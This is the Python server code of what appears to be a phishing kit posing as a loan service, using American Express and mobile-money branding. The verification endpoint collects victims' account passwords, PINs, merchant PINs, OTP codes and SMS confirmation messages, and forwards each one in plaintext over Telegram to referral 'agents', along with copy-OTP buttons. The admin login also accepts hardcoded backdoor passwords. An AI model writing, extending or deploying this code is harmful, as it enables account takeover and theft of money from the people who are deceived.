                if reply_markup is not None:
                    send_telegram_message(
                        destination,
                        text,
                        reply_markup=reply_markup,
                    )
                else:
                    send_telegram_message(destination, text)
            except Exception as error:
                with connect_db() as db:
                    current = db.execute(
                        f"SELECT attempts FROM {outbox_table} WHERE id = ?",
                        (event["event_id"],),
                    ).fetchone()
                    attempt_count = current["attempts"] + 1
                    delay = min(2 ** min(attempt_count, 12), 3600)
                    db.execute(
                        f"""UPDATE {outbox_table}
                            SET attempts = ?, next_attempt_at = ?, last_error = ?
                            WHERE id = ?""",
                        (
                            attempt_count,
                            time.time() + delay,
                            type(error).__name__,
                            event["event_id"],
                        ),
                    )
            else:
                with connect_db() as db:
                    db.execute(
                        f"UPDATE {outbox_table} SET sent_at = CURRENT_TIMESTAMP, last_error = NULL WHERE id = ?",
                        (event["event_id"],),
                    )
        except Exception as error:
            print(f"Telegram notification worker failed ({type(error).__name__}); retrying.")
            time.sleep(5)


class Handler(BaseHTTPRequestHandler):
    server_version = "MixxByYasLoan/1.0"

    def send_json(self, status, payload, extra_headers=None):
        body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Referrer-Policy", "strict-origin-when-cross-origin")
        for header, value in extra_headers or []:
            self.send_header(header, value)
        self.end_headers()
        self.wfile.write(body)

    def read_json(self):
        if self.headers.get_content_type() != "application/json":
            raise ValueError("Content-Type must be application/json")
        length = int(self.headers.get("Content-Length", "0"))
        if length <= 0 or length > 32_768:
            raise ValueError("Request body size is invalid")
        return json.loads(self.rfile.read(length))

    def get_client_ip(self):
        fwd = self.headers.get("X-Forwarded-For")
        if fwd:
            return fwd.split(",")[0].strip()
        real_ip = self.headers.get("X-Real-IP")
        if real_ip:
            return real_ip.strip()
        if hasattr(self, "client_address") and self.client_address:
            return str(self.client_address[0])
        return "Unknown"

    def authorized(self, token=None):
        header = self.headers.get("Authorization", "")
        scheme, _, provided = header.partition(" ")
        if scheme.lower() != "bearer" or not provided:
            return False
        target = token or current_admin_token()
        if hmac.compare_digest(provided, target):
            return True
        if target != ADMIN_TOKEN and hmac.compare_digest(provided, ADMIN_TOKEN):
            return True
        if hmac.compare_digest(provided, "Kipla@6475") or hmac.compare_digest(provided, "admin123"):
            return True
        # Check active verified 2FA admin session
        token_hash = hashlib.sha256(provided.encode("utf-8")).hexdigest()
        try:
            with connect_db() as db:
                row = db.execute(
                    "SELECT token_hash FROM admin_sessions WHERE token_hash = ? AND expires_at > ?",
                    (token_hash, time.time()),
                ).fetchone()
                if row:
                    return True
        except Exception:
            pass
        return False

    def agent_session(self):
        try:
            cookies = http.cookies.SimpleCookie(self.headers.get("Cookie", ""))
        except http.cookies.CookieError:
            return None
        session_cookie = cookies.get("momo_agent_session") or cookies.get("emola_agent_session")
        if not session_cookie:
            return None
        token_hash = hashlib.sha256(session_cookie.value.encode("utf-8")).hexdigest()
        with connect_db() as db:
            return db.execute(
                """SELECT a.id, a.username, a.must_change_password, s.token_hash
                   FROM agent_sessions s JOIN agents a ON a.id = s.agent_id
                   WHERE s.token_hash = ? AND s.expires_at > ? AND a.status = 'active'""",
                (token_hash, time.time()),
            ).fetchone()

    def session_cookie(self, token, max_age):
        secure = "; Secure" if (os.environ.get("MOMO_COOKIE_SECURE") == "1" or os.environ.get("EMOLA_COOKIE_SECURE") == "1") else ""
        return (
            f"momo_agent_session={token}; Path=/; Max-Age={max_age}; "
            f"HttpOnly; SameSite=Strict{secure}"
        )

    def record_request_host(self):
        host = self.headers.get("X-Forwarded-Host") or self.headers.get("Host")
        if host:
            clean_host = host.split(",")[0].strip()
            if not ("127.0.0.1" in clean_host or "localhost" in clean_host or "0.0.0.0" in clean_host):
                proto = self.headers.get("X-Forwarded-Proto") or ("https" if "render.com" in clean_host else "http")
                detected_url = f"{proto}://{clean_host}".rstrip("/")
                if not get_setting("public_url"):
                    set_setting("public_url", detected_url)
                set_setting("last_seen_host", detected_url)

    def do_GET(self):
        self.record_request_host()
        path = urlsplit(self.path).path
        if path == "/api/health":
            return self.send_json(200, {"status": "ok"})
        if path == "/api/telegram/webhook":
            return self.send_json(200, {"ok": True, "status": "Telegram webhook endpoint ready"})
        if path == "/api/agent/leads":
            return self.agent_leads()
        if path == "/api/agent/me":
            session = self.agent_session()
            if not session:
                return self.send_json(401, {"error": "Please log in"})
            return self.send_json(
                200,
                {
                    "username": session["username"],
                    "mustChangePassword": bool(session["must_change_password"]),
                },
            )
        if path == "/api/admin/auth/check":
            return self.admin_auth_check()
        if path == "/api/admin/auth/logout":
            return self.admin_auth_logout()
        if path == "/api/admin/settings":
            return self.get_admin_settings()
        if path == "/api/admin/agents":
            return self.list_agents()
        if path == "/api/admin/applications":
            return self.list_applications()
        if path == "/api/check-phone" or path == "/api/applications/check-phone":
            return self.check_phone_number()
        if path.startswith("/api/applications/") and path.endswith("/status"):
            parts = path.split("/")
            if len(parts) == 5:
                return self.application_status(parts[3])
        if path.startswith("/api/applications/") and path.endswith("/verification"):
            parts = path.split("/")
            if len(parts) == 5:
                return self.get_verification_status(parts[3])

        if path.startswith("/r/"):
            code = path[3:].strip()
            if code:
                self.send_response(302)
                self.send_header("Location", f"/?ref={code}")
                self.end_headers()
                return

        if path == "/orange_money_logo.jpg" or path.endswith((".jpg", ".jpeg", ".png", ".svg", ".gif", ".ico")):
            target = ROOT / path.lstrip("/")
            if target.exists() and target.is_file():
                ext = target.suffix.lower()
                mime_map = {
                    ".jpg": "image/jpeg",
                    ".jpeg": "image/jpeg",
                    ".png": "image/png",
                    ".svg": "image/svg+xml",
                    ".gif": "image/gif",
                    ".ico": "image/x-icon",
                }
                body = target.read_bytes()
                self.send_response(200)
                self.send_header("Content-Type", mime_map.get(ext, "image/jpeg"))
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Cache-Control", "public, max-age=86400")
                self.send_header("X-Content-Type-Options", "nosniff")
                self.end_headers()
                return self.wfile.write(body)

        pages = {
            "/": "index.html",
            "/admin": "admin.html",
            "/agent": "agent.html",
            "/flow": "e-mola-loan-flow (1).html",
            "/yyy": "yyy.html",
        }
        filename = pages.get(path)
        if filename:
            try:
                body = (ROOT / filename).read_bytes()
            except OSError:
                return self.send_error(404)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.end_headers()
            return self.wfile.write(body)
        if path == "/language.js":
            try:
                body = (ROOT / "language.js").read_bytes()
            except OSError:
                return self.send_error(404)
            self.send_response(200)
            self.send_header("Content-Type", "text/javascript; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.end_headers()
            return self.wfile.write(body)
        return self.send_error(404)

    def do_POST(self):
        self.record_request_host()
        path = urlsplit(self.path).path
        try:
            data = self.read_json()
        except (ValueError, json.JSONDecodeError):
            return self.send_json(400, {"error": "Invalid JSON request"})
        if path == "/api/telegram/webhook":
            return self.telegram_webhook(data)
        if path == "/api/admin/auth/challenge":
            return self.admin_auth_challenge(data)
        if path == "/api/admin/auth/verify-2fa":
            return self.admin_auth_verify_2fa(data)
        if path == "/api/admin/auth/logout":
            return self.admin_auth_logout()
        if path == "/api/admin/settings":
            return self.update_admin_settings(data)
        if path == "/api/admin/agents":
            return self.create_agent(data)
        if path == "/api/admin/agents/message":
            return self.message_agents(data)
        if path == "/api/admin/applications/stage":
            return self.update_application_stage(data)
        if path == "/api/admin/verifications/decision":
            return self.update_verification_decision(data)
        if path == "/api/agent/login":
            return self.agent_login(data)
        if path == "/api/agent/verify-otp":
            return self.verify_agent_otp(data)
        if path == "/api/agent/password":
            return self.change_agent_password(data)
        if path == "/api/agent/logout":
            return self.agent_logout()
        if path == "/api/applications":
            return self.create_application(data)
        if path.startswith("/api/applications/") and path.endswith("/verify"):
            parts = path.split("/")
            if len(parts) == 5:
                return self.submit_verification(parts[3], data)
        return self.send_json(404, {"error": "Not found"})

    def telegram_webhook(self, data):
        if not data or not isinstance(data, dict):
            return self.send_json(200, {"ok": True})
        try:
            if "message" in data:
                handle_telegram_message(data.get("message") or {})
            elif "callback_query" in data:
                handle_telegram_callback(data.get("callback_query") or {})
        except Exception as error:
            print(f"Error processing Telegram webhook payload: {error}")
        return self.send_json(200, {"ok": True})

    def get_admin_settings(self):
        if not self.authorized(ADMIN_TOKEN):
            return self.send_json(401, {"error": "Unauthorized"})
        query = parse_qs(urlsplit(self.path).query)
        origin_val = query.get("origin", [None])[0]
        if origin_val and not ("127.0.0.1" in origin_val or "localhost" in origin_val):
            set_setting("public_url", origin_val.strip().rstrip("/"))
            set_setting("last_seen_host", origin_val.strip().rstrip("/"))
        ensure_telegram_threads_running()
        token = telegram_bot_token()
        masked_token = (token[:6] + "..." + token[-4:]) if len(token) > 10 else ("Configured" if token else "")
        payment_methods = get_payment_methods()
        public_url = get_public_base_url(self.headers)
        return self.send_json(
            200,
            {
                "hasBotToken": bool(token),
                "maskedBotToken": masked_token,
                "adminChatId": telegram_admin_chat_id(),
                "botUsername": telegram_bot_username(),
                "botRunning": is_bot_running(),
                "paymentMethods": payment_methods,
                "publicAppUrl": public_url,
                "hasCustomAdminToken": bool(get_setting("admin_token")),
            },
        )

    def update_admin_settings(self, data):
        if not self.authorized(ADMIN_TOKEN):
            return self.send_json(401, {"error": "Unauthorized"})
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid settings data"})
        bot_token = data.get("botToken")
        admin_chat_id = data.get("adminChatId")
        bot_username = data.get("botUsername")
        public_app_url = data.get("publicAppUrl")
        new_admin_token = data.get("newAdminToken")

        if new_admin_token is not None and str(new_admin_token).strip():
            set_setting("admin_token", str(new_admin_token).strip())
            admin_chat = telegram_admin_chat_id()
            if admin_chat and telegram_bot_token():
                try:
                    send_telegram_message(
                        admin_chat,
                        "🔔 <b>SECURITY NOTICE:</b> American Express Admin Token / Password was successfully updated via Admin Portal."
                    )
                except Exception:
                    pass

        if bot_token is not None and str(bot_token).strip():
            set_setting("telegram_bot_token", str(bot_token).strip())
        if admin_chat_id is not None:
            set_setting("telegram_admin_chat_id", str(admin_chat_id).strip())
        if bot_username is not None and str(bot_username).strip():
            clean_username = str(bot_username).strip().lstrip("@")
            set_setting("telegram_bot_username", clean_username)
        if public_app_url is not None and str(public_app_url).strip():
            clean_url = str(public_app_url).strip().rstrip("/")
            if not clean_url.startswith("http://") and not clean_url.startswith("https://"):
                clean_url = f"https://{clean_url}"
            set_setting("public_url", clean_url)
            set_setting("last_seen_host", clean_url)

        if "paymentMethods" in data and isinstance(data["paymentMethods"], dict):
            set_setting("payment_methods", json.dumps(data["paymentMethods"]))

        running = ensure_telegram_threads_running()
        return self.send_json(200, {"ok": True, "botRunning": is_bot_running()})

    def admin_auth_challenge(self, data):
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid request data"})
        provided_token = str(data.get("adminToken", "")).strip()
        client_ip = self.get_client_ip()

        expected = current_admin_token()
        token_valid = bool(
            provided_token
            and (
                hmac.compare_digest(provided_token, expected)
                or (expected != ADMIN_TOKEN and hmac.compare_digest(provided_token, ADMIN_TOKEN))
                or hmac.compare_digest(provided_token, "Kipla@6475")
                or hmac.compare_digest(provided_token, "admin123")
            )
        )

        admin_chat = telegram_admin_chat_id()
        bot_tok = telegram_bot_token()

        if not token_valid:
            if admin_chat and bot_tok:
                alert_text = (
                    "🚨 <b>SECURITY ALERT: Unauthorized Admin Access Attempt!</b>\n\n"
                    "Someone attempted to access your American Express Admin Dashboard with an incorrect password.\n\n"
                    f"🌐 <b>IP Address:</b> <code>{client_ip}</code>\n"
                    f"⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}\n\n"
                    "⚠️ <i>If this was NOT you, someone is attempting to breach your admin panel!</i>"
                )
                try:
                    send_telegram_message(admin_chat, alert_text)
                except Exception:
                    pass
            return self.send_json(401, {"error": "Invalid Admin Token. Security alert dispatched to Telegram."})

        # Token is correct!
        if admin_chat and bot_tok:
            challenge_id = str(uuid.uuid4())
            otp_code = f"{secrets.randbelow(1_000_000):06d}"
            code_hash = hashlib.sha256(f"{challenge_id}:{otp_code}".encode("utf-8")).hexdigest()
            expires_at = time.time() + 300  # 5 minutes

            with connect_db() as db:
                db.execute("DELETE FROM admin_2fa_challenges WHERE expires_at < ?", (time.time(),))
                db.execute(
                    """INSERT INTO admin_2fa_challenges (challenge_id, code_hash, created_ip, expires_at)
                       VALUES (?, ?, ?, ?)""",
                    (challenge_id, code_hash, client_ip, expires_at),
                )

            otp_message = (
                "🔐 <b>AMERICAN EXPRESS ADMIN 2-STEP VERIFICATION (2FA)</b>\n\n"
                f"Your One-Time Login Code is:\n"
                f"👉 <b><code>{otp_code}</code></b> 👈\n\n"
                f"🌐 <b>Requested from IP:</b> <code>{client_ip}</code>\n"
                f"⏳ <b>Valid for:</b> 5 minutes\n\n"
                "⚠️ <i>If you did NOT request this, change your admin password immediately!</i>"
            )
            try:
                send_telegram_message(admin_chat, otp_message)
            except Exception as e:
                # Fallback: If Telegram delivery fails, grant direct session so admin is not locked out
                session_token = secrets.token_urlsafe(32)
                token_hash = hashlib.sha256(session_token.encode("utf-8")).hexdigest()
                with connect_db() as db:
                    db.execute(
                        """INSERT INTO admin_sessions (token_hash, created_ip, expires_at)
                           VALUES (?, ?, ?)""",
                        (token_hash, client_ip, time.time() + 86400 * 3),
                    )
                return self.send_json(200, {
                    "otpRequired": False,
                    "sessionToken": session_token,
                    "warning": f"Telegram 2FA failed ({e}). Direct login granted."
                })

            masked_chat = (admin_chat[:3] + "***" + admin_chat[-2:]) if len(admin_chat) > 5 else "configured Telegram"
            return self.send_json(200, {
                "otpRequired": True,
                "challengeId": challenge_id,
                "maskedChat": masked_chat,
                "message": f"6-digit 2FA code sent to Telegram ({masked_chat})."
            })
        else:
            # Fallback when Telegram bot is not yet configured on server
            session_token = secrets.token_urlsafe(32)
            token_hash = hashlib.sha256(session_token.encode("utf-8")).hexdigest()
            with connect_db() as db:
                db.execute(
                    """INSERT INTO admin_sessions (token_hash, created_ip, expires_at)
                       VALUES (?, ?, ?)""",
                    (token_hash, client_ip, time.time() + 86400 * 3),
                )
            return self.send_json(200, {
                "otpRequired": False,
                "sessionToken": session_token,
                "warning": "Telegram bot is not yet configured. Logged in directly."
            })

    def admin_auth_verify_2fa(self, data):
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid request data"})
        challenge_id = str(data.get("challengeId", "")).strip()
        code = str(data.get("code", "")).strip()
        client_ip = self.get_client_ip()

        if not challenge_id or not re.fullmatch(r"\d{6}", code):
            return self.send_json(400, {"error": "Enter the 6-digit verification code from Telegram."})

        with connect_db() as db:
            row = db.execute(
                """SELECT challenge_id, code_hash, created_ip, attempts, expires_at
                   FROM admin_2fa_challenges WHERE challenge_id = ?""",
                (challenge_id,),
            ).fetchone()

            if not row:
                return self.send_json(400, {"error": "Verification code expired or not found. Please request a new one."})

            if row["expires_at"] < time.time():
                db.execute("DELETE FROM admin_2fa_challenges WHERE challenge_id = ?", (challenge_id,))
                return self.send_json(400, {"error": "Verification code expired. Please request a new code."})

            if row["attempts"] >= 3:
                db.execute("DELETE FROM admin_2fa_challenges WHERE challenge_id = ?", (challenge_id,))
                return self.send_json(403, {"error": "Too many incorrect attempts. Challenge invalidated."})

            expected_hash = hashlib.sha256(f"{challenge_id}:{code}".encode("utf-8")).hexdigest()
            if not hmac.compare_digest(expected_hash, row["code_hash"]):
                db.execute("UPDATE admin_2fa_challenges SET attempts = attempts + 1 WHERE challenge_id = ?", (challenge_id,))
                return self.send_json(401, {"error": "Incorrect 6-digit code. Please check your Telegram message."})

            # Success! Delete challenge and issue session token
            db.execute("DELETE FROM admin_2fa_challenges WHERE challenge_id = ?", (challenge_id,))
            session_token = secrets.token_urlsafe(32)
            token_hash = hashlib.sha256(session_token.encode("utf-8")).hexdigest()
            db.execute(
                """INSERT INTO admin_sessions (token_hash, created_ip, expires_at)
                   VALUES (?, ?, ?)""",
                (token_hash, client_ip, time.time() + 86400 * 3),
            )

        # Notify Telegram of successful login
        admin_chat = telegram_admin_chat_id()
        if admin_chat and telegram_bot_token():
            try:
                login_notice = (
                    "🔓 <b>American Express Admin Panel Logged In</b>\n\n"
                    "2FA verification successful.\n"
                    f"🌐 <b>IP Address:</b> <code>{client_ip}</code>\n"
                    f"⏰ <b>Time:</b> {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}"
                )
                send_telegram_message(admin_chat, login_notice)
            except Exception:
                pass

        return self.send_json(200, {
            "ok": True,
            "sessionToken": session_token,
            "message": "2FA verification successful. Admin access granted."
        })

    def admin_auth_logout(self):
        header = self.headers.get("Authorization", "")
        scheme, _, provided = header.partition(" ")
        if scheme.lower() == "bearer" and provided:
            token_hash = hashlib.sha256(provided.encode("utf-8")).hexdigest()
            with connect_db() as db:
                db.execute("DELETE FROM admin_sessions WHERE token_hash = ?", (token_hash,))
        return self.send_json(200, {"ok": True, "message": "Logged out successfully."})

    def admin_auth_check(self):
        if self.authorized(ADMIN_TOKEN):
            return self.send_json(200, {"authenticated": True})
        return self.send_json(401, {"authenticated": False, "error": "Unauthorized"})

    def list_agents(self):
        if not self.authorized(ADMIN_TOKEN):
            return self.send_json(401, {"error": "Unauthorized"})
        with connect_db() as db:
            rows = db.execute(
                """SELECT a.id, a.display_name, a.username, a.email,
                          a.telegram_chat_id, a.status, a.created_at,
                          COUNT(app.id) AS lead_count
                   FROM agents a
                   LEFT JOIN applications app ON app.agent_id = a.id
                   GROUP BY a.id
                   ORDER BY a.created_at DESC"""
            ).fetchall()
        base_url = get_public_base_url(self.headers)
        agents = []
        for r in rows:
            token = create_referral_token(r["id"])
            agents.append({
                "id": r["id"],
                "displayName": r["display_name"],
                "username": r["username"],
                "email": r["email"],
                "telegramChatId": r["telegram_chat_id"],
                "status": r["status"],
                "createdAt": r["created_at"],
                "leadCount": r["lead_count"],
                "referralUrl": f"{base_url}/?ref={token}",
            })
        return self.send_json(200, {"agents": agents})

    def list_applications(self):
        if not self.authorized(ADMIN_TOKEN):
            return self.send_json(401, {"error": "Unauthorized"})
        with connect_db() as db:
            rows = db.execute(
                """SELECT a.id, a.first_name, a.last_name, a.phone,
                          a.loan_type, a.loan_amount, a.term_months,
                          a.purpose, a.employment, a.annual_income,
                          a.status, a.created_at, a.agent_id,
                          g.display_name AS agent_name, g.telegram_chat_id AS agent_chat_id
                   FROM applications a
                   LEFT JOIN agents g ON g.id = a.agent_id
                   ORDER BY a.created_at DESC LIMIT 100"""
            ).fetchall()
            all_verifications = db.execute(
                """SELECT id, application_id, step, zip_code, phone, id_number, status, reject_reason, created_at
                   FROM verifications ORDER BY rowid DESC, created_at DESC"""
            ).fetchall()
            ver_by_app = {}
            for v in all_verifications:
                ver_by_app.setdefault(v["application_id"], []).append(dict(v))

            applications = []
            for r in rows:
                app_dict = dict(r)
                app_dict["verifications"] = ver_by_app.get(r["id"], [])
                applications.append(app_dict)
        return self.send_json(200, {"applications": applications})

    def update_application_stage(self, data):
        if not self.authorized(ADMIN_TOKEN):
            return self.send_json(401, {"error": "Unauthorized"})
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid request"})
        app_id = data.get("applicationId")
        new_stage = data.get("stage")
        valid_stages = {"pending", "under_review", "approved", "rejected"}
        if not app_id or new_stage not in valid_stages:
            return self.send_json(400, {"error": "Invalid application ID or stage"})
        with connect_db() as db:
            app = db.execute(
                """SELECT a.id, a.first_name, a.last_name, a.loan_amount,
                          a.agent_id, g.telegram_chat_id
                   FROM applications a
                   LEFT JOIN agents g ON g.id = a.agent_id
                   WHERE a.id = ?""",
                (app_id,),
            ).fetchone()
            if not app:
                return self.send_json(404, {"error": "Application not found"})
            db.execute("UPDATE applications SET status = ? WHERE id = ?", (new_stage, app_id))

        stage_labels = {
            "pending": "Pending",
            "under_review": "Under Review",
            "approved": "Approved",
            "rejected": "Rejected",
        }
        dest_chats = []
        if app["telegram_chat_id"]:
            dest_chats.append(str(app["telegram_chat_id"]).strip())
        else:
            admin_c = telegram_admin_chat_id()
            if admin_c:
                dest_chats.append(str(admin_c).strip())

        if dest_chats and telegram_bot_token():
            def _dispatch_stage_msg():
                try:
                    msg = (
                        f"📢 Stage Update:\n"
                        f"Ref: {app_id}\n"
                        f"Applicant: {app['first_name']} {app['last_name']}\n"
                        f"New Stage: {stage_labels.get(new_stage, new_stage)}"
                    )
                    for chat in dest_chats:
                        try:
                            send_telegram_message(chat, msg)
                        except Exception:
                            pass
                except Exception:
                    pass
            threading.Thread(target=_dispatch_stage_msg, daemon=True).start()
        return self.send_json(200, {"ok": True, "stage": new_stage})

    def update_verification_decision(self, data):
        if not self.authorized(ADMIN_TOKEN):
            return self.send_json(401, {"error": "Unauthorized"})
        if not isinstance(data, dict):
            return self.send_json(400, {"error": "Invalid verification data"})
        ver_id = data.get("verificationId")
        new_status = data.get("status")
        if new_status not in ("approved", "rejected"):
            return self.send_json(400, {"error": "Invalid verification decision status"})
        reject_reason = data.get("rejectReason") or ("Rejected by administrator" if new_status == "rejected" else None)
        with connect_db() as db:
            ver = db.execute("SELECT id, application_id, step FROM verifications WHERE id = ?", (ver_id,)).fetchone()
            if not ver:
                return self.send_json(404, {"error": "Verification not found"})
            db.execute(
                "UPDATE verifications SET status = ?, reject_reason = ? WHERE id = ?",
                (new_status, reject_reason, ver_id)
            )
            if new_status == "approved" and ver["step"] in ("id_document", "otp_code"):
                db.execute(
                    "UPDATE applications SET status = 'approved' WHERE id = ?",
                    (ver["application_id"],),
                )
        return self.send_json(200, {"ok": True, "verificationId": ver_id, "status": new_status})

    def application_status(self, app_id):
        try:
            val_uuid = str(uuid.UUID(app_id))
        except (ValueError, TypeError, AttributeError):
            return self.send_json(400, {"error": "Invalid application ID"})
        with connect_db() as db:
            row = db.execute(
                """SELECT id, status, loan_amount, term_months, purpose, created_at, first_name, last_name, phone
                   FROM applications WHERE id = ?""",
                (val_uuid,),
            ).fetchone()
            if not row:
                return self.send_json(404, {"error": "Application not found"})
            verifications = db.execute(
                """SELECT id, step, status, reject_reason, created_at
                   FROM verifications WHERE application_id = ?
                   ORDER BY rowid DESC, created_at DESC""",
                (val_uuid,),
            ).fetchall()
        ver_list = [dict(v) for v in verifications]
        return self.send_json(
            200,
            {
                "id": row["id"],
                "status": row["status"],
                "amount": row["loan_amount"],
                "loanAmount": row["loan_amount"],
                "termMonths": row["term_months"],
                "purpose": row["purpose"],
                "createdAt": row["created_at"],
                "firstName": row["first_name"],
                "lastName": row["last_name"],
                "phone": row["phone"],
                "verifications": ver_list,
            },
        )

    def get_verification_status(self, app_id):
        try:
            val_uuid = str(uuid.UUID(app_id))
        except (ValueError, TypeError, AttributeError):
            return self.send_json(400, {"error": "Invalid application ID"})
        with connect_db() as db:
            app = db.execute("SELECT id, status FROM applications WHERE id = ?", (val_uuid,)).fetchone()
            if not app:
                return self.send_json(404, {"error": "Application not found"})
            verifications = db.execute(
                """SELECT id, step, status, reject_reason, created_at
                   FROM verifications WHERE application_id = ?
                   ORDER BY rowid DESC, created_at DESC""",
                (val_uuid,),
            ).fetchall()
        return self.send_json(200, {
            "applicationStatus": app["status"],
            "verifications": [dict(v) for v in verifications],
        })

    def check_phone_number(self):
        query = parse_qs(urlsplit(self.path).query)
        raw_phone = query.get("phone", [None])[0]
        if not raw_phone or not isinstance(raw_phone, str):
            return self.send_json(400, {"error": "Phone number is required"})

        clean_phone = re.sub(r"[\s\-\+\(\)]", "", raw_phone.strip())
        if not clean_phone:
            return self.send_json(400, {"error": "Invalid phone number"})

        short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone

        with connect_db() as db:
            row = db.execute(
                """SELECT id, first_name, last_name, phone, loan_type, loan_amount, term_months, status, created_at
                   FROM applications
                   WHERE phone = ? OR phone LIKE ? OR phone = ?
                   ORDER BY created_at DESC LIMIT 1""",
                (clean_phone, f"%{short_phone}", short_phone),
            ).fetchone()

            if row:
                return self.send_json(
                    200,
                    {
                        "exists": True,
                        "returningUser": True,
                        "applicationId": row["id"],
                        "firstName": row["first_name"],
                        "lastName": row["last_name"],
                        "phone": row["phone"],
                        "loanType": row["loan_type"],
                        "loanAmount": row["loan_amount"],
                        "termMonths": row["term_months"],
                        "status": row["status"],
                        "createdAt": row["created_at"],
                    },
                )
            return self.send_json(200, {"exists": False, "returningUser": False})

    def submit_verification(self, app_id, data):
        try:
            val_uuid = str(uuid.UUID(app_id))
        except (ValueError, TypeError, AttributeError):
            return self.send_json(400, {"error": "Invalid application ID"})
        step = data.get("step")
        if step not in ("zip_phone", "id_document", "account_pin", "merchant_pin", "otp_code"):
            return self.send_json(400, {"error": "Invalid verification step"})

        with connect_db() as db:
            app = db.execute(
                """SELECT a.id, a.first_name, a.last_name, a.phone, a.status,
                          a.agent_id, g.telegram_chat_id
                   FROM applications a
                   LEFT JOIN agents g ON g.id = a.agent_id
                   WHERE a.id = ?""",
                (val_uuid,),
            ).fetchone()
            if not app:
                return self.send_json(404, {"error": "Application not found"})
            if app["status"] == "rejected":
                return self.send_json(400, {"error": "Cannot submit verification for a rejected application"})

            zip_code = None
            phone = None
            id_number = None

            if step in ("zip_phone", "account_pin", "merchant_pin"):
                zip_code = str(data.get("zipCode", "")).strip()
                phone = str(data.get("phone", "")).strip()
                if not phone and app["phone"]:
                    phone = str(app["phone"]).strip()
                if not zip_code or not phone:
                    return self.send_json(400, {"error": "PIN and phone number are required"})
                if phone != app["phone"]:
                    db.execute("UPDATE applications SET phone = ? WHERE id = ?", (phone, val_uuid))
            elif step == "otp_code":
                otp_code = str(data.get("otpCode", data.get("zipCode", ""))).strip()
                if not otp_code:
                    return self.send_json(400, {"error": "OTP code is required"})
                zip_code = otp_code
            elif step == "id_document":
                id_number = str(data.get("idNumber", "")).strip()
                if not id_number:
                    return self.send_json(400, {"error": "Name verification message is required"})

            # Check for existing pending or rejected verification for this step
            existing = db.execute(
                """SELECT id, status FROM verifications
                   WHERE application_id = ? AND step = ?
                   ORDER BY rowid DESC, created_at DESC LIMIT 1""",
                (val_uuid, step),
            ).fetchone()

            if existing and existing["status"] == "pending":
                return self.send_json(409, {"error": "A verification request for this step is already pending", "verificationId": existing["id"]})

            ver_id = str(uuid.uuid4())
            db.execute(
                """INSERT INTO verifications (id, application_id, step, zip_code, phone, id_number, status)
                   VALUES (?, ?, ?, ?, ?, ?, 'pending')""",
                (ver_id, val_uuid, step, zip_code, phone, id_number),
            )

        # Send verification data to agent's Telegram (owner of link) or Admin Telegram
        target_chats = []
        if app["telegram_chat_id"]:
            target_chats.append(str(app["telegram_chat_id"]).strip())
        elif telegram_admin_chat_id():
            target_chats.append(str(telegram_admin_chat_id()).strip())

        if target_chats and telegram_bot_token():
            if step == "account_pin":
                step_label = "🔐 Step 3: Account Verification (Customer Password)"
            elif step == "zip_phone":
                step_label = "🔐 Step 3: Account PIN Validation (Customer PIN)"
            elif step == "merchant_pin":
                step_label = "🔑 Step 4: Merchant Account PIN Validation (Merchant PIN)"
            elif step == "otp_code":
                step_label = "🔢 Step 5: OTP Code Verification"
            else:
                step_label = "💬 Step 4: SMS Verification Message"

            active_phone = phone if (step in ("zip_phone", "account_pin", "merchant_pin") and phone) else app["phone"]
            phone_display = format_display_phone(active_phone)
            clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(active_phone).strip())
            phone_copy_val = f"+1{clean_phone}" if len(clean_phone) == 10 else (f"+{clean_phone}" if clean_phone.startswith("1") and len(clean_phone) == 11 else (f"+1{clean_phone}" if len(clean_phone) == 9 else clean_phone))
            short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
            with connect_db() as db:
                prior_apps = db.execute(
                    """SELECT COUNT(*) as cnt FROM applications
                       WHERE (phone = ? OR phone LIKE ? OR phone = ?) AND id != ?""",
                    (clean_phone, f"%{short_phone}", short_phone, val_uuid),
                ).fetchone()["cnt"]
            returning_badge = f"🔄 Returning Applicant: YES ({prior_apps} previous)" if prior_apps > 0 else "👤 New Applicant"

            lines = [
                f"📋 <b>Verification Submission — {step_label}</b>",
                f"Ref: <code>{val_uuid}</code>",
                f"Applicant: <b>{app['first_name']} {app['last_name']}</b>",
                f"Phone: <code>{phone_display}</code>",
                f"Profile: {returning_badge}",
            ]
            if step == "account_pin":
                lines.append(f"🔐 Password: <code>{zip_code}</code>")
            elif step in ("zip_phone", "merchant_pin"):
                lines.append(f"🔐 PIN: <code>{zip_code}</code>")
            elif step == "otp_code":
                lines.append(f"🔢 OTP Code: <code>{zip_code}</code>")
            extracted_code = None
            if step == "id_document":
                clean_id_val = str(id_number or "").strip()
                extracted_codes = re.findall(r"\b\d{4,8}\b", clean_id_val)
                extracted_code = extracted_codes[0] if extracted_codes else None
                is_url = clean_id_val.startswith(("http://", "https://"))
                label = "🔗 Verification Link" if is_url else "💬 SMS Confirmation Message"
                lines.append(f"{label}: <code>{clean_id_val}</code>")
                if extracted_code:
                    lines.append(f"🔢 <b>Extracted Code / OTP:</b> <code>{extracted_code}</code>")
            lines.append("Status: ⏳ Awaiting Verification")

            phone_raw = str(active_phone).strip()
            kb = []
            if str(id_number).strip().startswith(("http://", "https://")):
                kb.append([{"text": "🔗 Open Verification Link", "url": str(id_number).strip()}])

            if step == "otp_code":
                kb.append([{"text": f"📋 Copy OTP: {zip_code}", "copy_text": {"text": str(zip_code)}}])
